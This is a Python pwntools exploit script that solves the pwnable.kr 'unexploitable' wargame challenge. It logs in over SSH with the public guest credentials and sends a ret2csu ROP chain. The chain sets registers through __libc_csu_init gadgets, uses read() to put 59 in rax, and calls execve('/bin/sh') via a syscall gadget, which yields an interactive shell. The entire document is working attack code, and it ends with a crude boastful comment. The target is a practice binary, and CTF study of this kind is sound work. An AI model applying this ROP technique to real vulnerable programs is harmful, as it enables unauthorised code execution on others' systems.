#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
import time
from pwn import *
#context.log_level = 'debug'


elf = ELF('./unexploitable')

# Mem locations
buf = elf.bss() + 0x100
dynamic_fini = 0x600e78

# ROP Gadgets
__libc_csu_init = elf.symbols['__libc_csu_init']
__libc_csu_init1 = __libc_csu_init + 80
__libc_csu_init2 = __libc_csu_init + 102
ret              = 0x400417  # for stack alignment
syscall          = 0x400560

# Byte sequence alias
A8 = 8 * b'A'


def main():
    """
    Main idea: call sys_execve("/bin/sh", NULL, NULL).
    Steps:
    1. set rax to 59 (modify rax using read()'s return value)
    2. set rdi to point to "/bin/sh"
    3. set rsi to 0
    4. set rdx to 0
    5. ret2syscall
    """
    remote = ssh(host="pwnable.kr", user="unexploitable", password="guest", port=2222)
    proc = remote.process('/home/unexploitable/unexploitable')

    #proc = elf.process()
    time.sleep(3)
    #log.debug('You may attatch this process to gdb now.')
    #raw_input()

    # Stage 1
    # ----------------------------------------------------
    # read(0, buf, 59)
    # rax will be 59
    payload  = A8 * 3                   # padding

    payload += p64(__libc_csu_init2)    # ret
    payload += A8                       # dummy (這題的 csu 比較特別)
    payload += p64(0)                   # rbx
    payload += p64(1)                   # rbp
    payload += p64(dynamic_fini)        # r12
    payload += p64(0)                   # r13 -> edi
    payload += p64(buf)                 # r14 -> rsi
    payload += p64(59)                  # r15 -> rdx
    payload += p64(__libc_csu_init1)    # ret -> call [r12 + rbx*8] ... -> r12 + rbx * 8 -> _fini

    payload += 7 * A8                   # padding
    payload += p64(ret)                 # ret (stack alignment)_
    payload += p64(elf.symbols['read']) # ret


    # Stage 2
    # ----------------------------------------------------
    # mov edi, buf
    # mov rsi, 0
    # mov rdx, 0
    # syscall
    payload += p64(__libc_csu_init2)    # ret
    payload += A8                       # dummy
    payload += p64(0)                   # rbx
    payload += p64(1)                   # rbp
    payload += p64(dynamic_fini)        # r12
    payload += p64(buf)                 # r13 -> edi
    payload += p64(0)                   # r14 -> rsi
    payload += p64(0)                   # r15 -> rdx
    payload += p64(__libc_csu_init1)    # ret -> call [r12 + rbx*8] ... -> r12 + rbx * 8 -> _fini

    payload += 7 * A8                   # padding
    payload += p64(syscall)             # ret
    proc.sendline(payload)

    # Write b'/bin/sh\x00' to `buf`
    proc.sendline(b'/bin/sh' + b'\x00' * (59 - 7))


    # I'm your god, bitch
    proc.interactive()


if __name__ == '__main__':
    main()
